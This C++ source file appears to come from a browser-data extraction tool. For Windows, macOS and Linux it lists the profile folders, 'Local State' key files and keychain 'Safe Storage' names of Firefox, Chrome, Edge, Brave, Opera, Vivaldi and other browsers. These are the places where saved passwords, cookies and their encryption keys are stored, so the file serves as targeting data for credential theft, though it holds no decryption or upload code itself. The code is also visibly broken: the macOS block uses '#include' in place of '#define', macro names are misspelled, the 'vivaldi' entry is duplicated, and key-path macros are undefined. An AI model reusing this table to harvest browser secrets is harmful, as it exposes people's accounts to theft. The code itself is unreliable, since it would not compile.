//
// Created by Finger on 8/10/2021.
//

#include "browser.h"
#include "browser_factory.h"

#if defined(WIN32) || defined(_WIN32) || defined(__WIN32__) || defined(__NT__)
#define firefoxProfilePath        "/AppData/Roaming/Mozilla/Firefox/Profiles/*.default-release*/"
#define fireFoxBetaProfilePath    "/AppData/Roaming/Mozilla/Firefox/Profiles/*.default-beta*/"
#define fireFoxDevProfilePath     "/AppData/Roaming/Mozilla/Firefox/Profiles/*.dev-edition-default*/"
#define fireFoxNightlyProfilePath "/AppData/Roaming/Mozilla/Firefox/Profiles/*.default-nightly*/"
#define fireFoxESRProfilePath     "/AppData/Roaming/Mozilla/Firefox/Profiles/*.default-esr*/"
#define chromeProfilePath         "/AppData/Local/Google/Chrome/User Data/*/"
#define chromeKeyPath             "/AppData/Local/Google/Chrome/User Data/Local State"
#define chromeBetaProfilePath     "/AppData/Local/Google/Chrome Beta/User Data/*/"
#define chromeBetaKeyPath         "/AppData/Local/Google/Chrome Beta/User Data/Local State"
#define chromiumProfilePath       "/AppData/Local/Chromium/User Data/*/"
#define chromiumKeyPath           "/AppData/Local/Chromium/User Data/Local State"
#define edgeProfilePath           "/AppData/Local/Microsoft/Edge/User Data/*/"
#define edgeKeyPath               "/AppData/Local/Microsoft/Edge/User Data/Local State"
#define braveProfilePath          "/AppData/Local/BraveSoftware/Brave-Browser/User Data/*/"
#define braveKeyPath              "/AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State"
#define speed360ProfilePath       "/AppData/Local/360chrome/Chrome/User Data/*/"
#define qqBrowserProfilePath      "/AppData/Local/Tencent/QQBrowser/User Data/*/"
#define operaProfilePath          "/AppData/Roaming/Opera Software/Opera Stable/"
#define operaKeyPath              "/AppData/Roaming/Opera Software/Opera Stable/Local State"
#define operaGXProfilePath        "/AppData/Roaming/Opera Software/Opera GX Stable/"
#define operaGXKeyPath            "/AppData/Roaming/Opera Software/Opera GX Stable/Local State"
#define vivaldiProfilePath        "/AppData/Local/Vivaldi/User Data/Default/"
#define vivaldiKeyPath            "/AppData/Local/Vivaldi/Local State"

string Browser::USERPROFILE = getenv("USERPROFILE");
map<string, BrowserConfig> Browser::browserList{
        {"firefox",         {.ProfilePath = USERPROFILE +
                                            firefoxProfilePath, .Name = firefoxName, .New = BrowserFactory::NewFirefox}},
        {"firefox-beta",    {.ProfilePath = USERPROFILE + fireFoxBetaProfilePath, .Name = firefoxBetaName,
                                    .New = BrowserFactory::NewFirefox}},
        {"firefox-dev",     {.ProfilePath = USERPROFILE + fireFoxDevProfilePath, .Name = firefoxDevName,
                                    .New = BrowserFactory::NewFirefox}},
        {"firefox-nightly", {.ProfilePath = USERPROFILE + fireFoxNightlyProfilePath, .Name = firefoxNightlyName,
                                    .New = BrowserFactory::NewFirefox}},
        {"firefox-esr",     {.ProfilePath = USERPROFILE + fireFoxESRProfilePath, .Name = firefoxESRName,
                                    .New = BrowserFactory::NewFirefox}},
        {"chrome",          {.ProfilePath = USERPROFILE + chromeProfilePath, .Name = chromeName, .KeyPath =
        USERPROFILE +
        chromeKeyPath,
                                    .New = BrowserFactory::NewChromium}},
        {"chrome-beta",     {.ProfilePath = USERPROFILE + chromeBetaProfilePath, .Name = chromeBetaName, .KeyPath =
        USERPROFILE +
        chromeBetaKeyPath,

                                    .New = BrowserFactory::NewChromium}},
        {"chromium",        {.ProfilePath = USERPROFILE + chromiumProfilePath, .Name = chromiumName, .KeyPath =
        USERPROFILE + chromiumKeyPath,

                                    .New = BrowserFactory::NewChromium}},
        {"edge",            {.ProfilePath = USERPROFILE + edgeProfilePath, .Name = edgeName, .KeyPath = USERPROFILE +
                                                                                                        edgeKeyPath,
                                    .New = BrowserFactory::NewChromium}},
        {"360",             {.ProfilePath = USERPROFILE + speed360ProfilePath, .Name = speed360Name,
                                    .New = BrowserFactory::NewChromium}},
        {"qq",              {.ProfilePath = USERPROFILE + qqBrowserProfilePath, .Name = qqBrowserName,
                                    .New = BrowserFactory::NewChromium}},
        {"brave",           {.ProfilePath = USERPROFILE + braveProfilePath, .Name = braveName, .KeyPath = USERPROFILE +
                                                                                                          braveKeyPath,
                                    .New = BrowserFactory::NewChromium}},
        {"opera",           {.ProfilePath = USERPROFILE + operaProfilePath, .Name = operaName, .KeyPath = USERPROFILE +
                                                                                                          operaKeyPath,
                                    .New = BrowserFactory::NewChromium}},
        {"opera-gx",        {.ProfilePath = USERPROFILE + operaGXProfilePath, .Name = operaGXName, .KeyPath =
        USERPROFILE +
        operaGXKeyPath,
                                    .New = BrowserFactory::NewChromium}},
        {"vivaldi",         {.ProfilePath = USERPROFILE + vivaldiProfilePath, .Name = vivaldiName, .KeyPath =
        USERPROFILE +
        vivaldiKeyPath,
                                    .New = BrowserFactory::NewChromium}},
        {"vivaldi",         {.ProfilePath = USERPROFILE + vivaldiProfilePath, .Name = vivaldiName, .KeyPath=
        USERPROFILE + vivaldiKeyPath, .New=BrowserFactory::NewChromium}}
};
#elif __APPLE__
#define fireFoxProfilePath        "/Users/*/Library/Application Support/Firefox/Profiles/*.default-release*/"
#define fireFoxBetaProfilePath    "/Users/*/Library/Application Support/Firefox/Profiles/*.default-beta*/"
#define fireFoxDevProfilePath     "/Users/*/Library/Application Support/Firefox/Profiles/*.dev-edition-default*/"
#define fireFoxNightlyProfilePath "/Users/*/Library/Application Support/Firefox/Profiles/*.default-nightly*/"
#define fireFoxESRProfilePath     "/Users/*/Library/Application Support/Firefox/Profiles/*.default-esr*/"
#define chromeProfilePath         "/Users/*/Library/Application Support/Google/Chrome/*/"
#define chromeBetaProfilePath     "/Users/*/Library/Application Support/Google/Chrome Beta/*/"
#define chromiumProfilePath       "/Users/*/Library/Application Support/Chromium/*/"
#define edgeProfilePath           "/Users/*/Library/Application Support/Microsoft Edge/*/"
#define braveProfilePath          "/Users/*/Library/Application Support/BraveSoftware/Brave-Browser/*/"
#define operaProfilePath          "/Users/*/Library/Application Support/com.operasoftware.Opera/"
#define operaGXProfilePath        "/Users/*/Library/Application Support/com.operasoftware.OperaGX/"
#define vivaldiProfilePath        "/Users/*/Library/Application Support/Vivaldi/*/"

#include chromeStorageName     "Chrome"
#include chromeBetaStorageName "Chrome"
#include chromiumStorageName   "Chromium"
#include edgeStorageName       "Microsoft Edge"
#include braveStorageName      "Brave"
#include operaStorageName      "Opera"
#include vivaldiStorageName    "Vivaldi"


map<string, BrowserConfig> Browser::browserList{
        {"firefox",         {.ProfilePath = firefoxProfilePath, .Name = firefoxName, .New =BrowserFactory::NewFirefox}},
        {"firefox-beta",    {.ProfilePath = fireFoxBetaProfilePath, .Name = firefoxBetaName,
                                    .New = BrowserFactory::NewFirefox}},
        {"firefox-dev",     {.ProfilePath = fireFoxDevProfilePath, .Name = firefoxDevName,
                                    .New = BrowserFactory::NewFirefox}},
        {"firefox-nightly", {.ProfilePath = fireFoxNightlyProfilePath, .Name = firefoxNightlyName,
                                    .New = BrowserFactory::NewFirefox}},
        {"firefox-esr",     {.ProfilePath = fireFoxESRProfilePath, .Name = firefoxESRName,
                                    .New = BrowserFactory::NewFirefox}},
        {"chrome",          {.ProfilePath = chromeProfilePath, .Name = chromeName, .KeyPath = chromeKeyPath, .Storage = chromeStorageName,
                                    .New = BrowserFactory::NewChromium}},
        {"chrome-beta",     {.ProfilePath = chromeBetaProfilePath, .Name = chromeBetaName, .KeyPath = chromeBetaKeyPath, .Storage = chromeBetaStorageName,

                                    .New = BrowserFactory::NewChromium}},
        {"chromium",        {.ProfilePath = chromiumProfilePath, .Name = chromiumName, .KeyPath = chromiumKeyPath, .Storage = chromiumStorageName,

                                    .New = BrowserFactory::NewChromium}},
        {"edge",            {.ProfilePath = edgeProfilePath, .Name = edgeName, .KeyPath = edgeKeyPath, .Storage = edgeStorageName,
                                    .New = BrowserFactory::NewChromium}},
        {"brave",           {.ProfilePath = braveProfilePath, .Name = braveName, .KeyPath = braveKeyPath, .Storage = braveStorageName,
                                    .New = BrowserFactory::NewChromium}},
        {"opera",           {.ProfilePath = operaProfilePath, .Name = operaName, .KeyPath = operaKeyPath, .Storage = operaStorageName,
                                    .New = BrowserFactory::NewChromium}},
        {"opera-gx",        {.ProfilePath = operaGXProfilePath, .Name = operaGXName, .KeyPath = operaGXKeyPath, .Storage = operaStorageName,
                                    .New = BrowserFactory::NewChromium}},
        {"vivaldi",         {.ProfilePath = vivaldiProfilePath, .Name = vivaldiName, .KeyPath = vivaldiKeyPath, .Storage = vivaldiStorageName,
                                    .New = BrowserFactory::NewChromium}}
};
#elif __linux__
#define fireFoxProfilePath        "/home/*/.mozilla/firefox/*.default-release*/"
#define fireFoxBetaProfilePath    "/home/*/.mozilla/firefox/*.default-beta*/"
#define fireFoxDevProfilePath     "/home/*/.mozilla/firefox/*.dev-edition-default*/"
#define fireFoxNightlyProfilePath "/home/*/.mozilla/firefox/*.default-nightly*/"
#define fireFoxESRProfilePath     "/home/*/.mozilla/firefox/*.default-esr*/"
#define chromeProfilePath         "/home/*/.config/google-chrome/*/"
#define chromiumProfilePath       "/home/*/.config/chromium/*/"
#define edgeProfilePath           "/home/*/.config/microsoft-edge*/*/"
#define braveProfilePath          "/home/*/.config/BraveSoftware/Brave-Browser/*/"
#define chromeBetaProfilePath     "/home/*/.config/google-chrome-beta/*/"
#define operaProfilePath          "/home/*/.config/opera/"
#define vivaldiProfilePath        "/home/*/.config/vivaldi/*/"

#define chromeStorageName     "Chrome Safe Storage"
#define chromiumStorageName   "Chromium Safe Storage"
#define edgeStorageName       "Chromium Safe Storage"
#define braveStorageName      "Brave Safe Storage"
#define chromeBetaStorageName "Chrome Safe Storage"
#define operaStorageName      "Chromium Safe Storage"
#define vivaldiStorageName    "Chrome Safe Storage"

map<string, BrowserConfig> Browser::browserList{
        {"firefox",         {.ProfilePath = firefoxProfilePath, .Name = firefoxName, .New = BrowserFactory::NewFirefox}},
        {"firefox-beta",    {.ProfilePath = fireFoxBetaProfilePath, .Name = firefoxBetaName,
                                    .New = BrowserFactory::NewFirefox}},
        {"firefox-dev",     {.ProfilePath = fireFoxDevProfilePath, .Name = firefoxDevName,
                                    .New = BrowserFactory::NewFirefox}},
        {"firefox-nightly", {.ProfilePath = fireFoxNightlyProfilePath, .Name = firefoxNightlyName,
                                    .New = BrowserFactory::NewFirefox}},
        {"firefox-esr",     {.ProfilePath = fireFoxESRProfilePath, .Name = firefoxESRName,
                                    .New = BrowserFactory::NewFirefox}},
        {"chrome",          {.ProfilePath = chromeProfilePath, .KeyPath = chromeKeyPath, .Name = chromeName, .Storage = chromeStorageName,
                                    .New = BrowserFactory::NewChromium}},
        {"chrome-beta",     {.ProfilePath = chromeBetaProfilePath, chromeBetaKeyPath,
                                    .Name = chromeBetaName, .Storage = chromeBetaStorageName,
                                    .New = BrowserFactory::NewChromium}},
        {"chromium",        {.ProfilePath = chromiumProfilePath, .KeyPath = chromiumKeyPath,
                                    .Name = chromiumName, .Storage = chromiumStorageName,
                                    .New = BrowserFactory::NewChromium}},
        {"edge",            {.ProfilePath = edgeProfilePath, .KeyPath = edgeKeyPath, .Name = edgeName, .Storage = edgeStorageName,
                                    .New = BrowserFactory::NewChromium}},
        {"brave",           {.ProfilePath = braveProfilePath, .KeyPath = braveKeyPath, .Name = braveName, .Storage = braveStorageName,
                                    .New = BrowserFactory::NewChromium}},
        {"opera",           {.ProfilePath = operaProfilePath, .KeyPath = operaKeyPath, .Name = operaName, .Storage = operaStorageName,
                                    .New = BrowserFactory::NewChromium}},
        {"vivaldi",         {.ProfilePath = vivaldiProfilePath, .KeyPath = vivaldiKeyPath, .Name = vivaldiName, .Storage = vivaldiStorageName,
                                    .New = BrowserFactory::NewChromium}}
};
#endif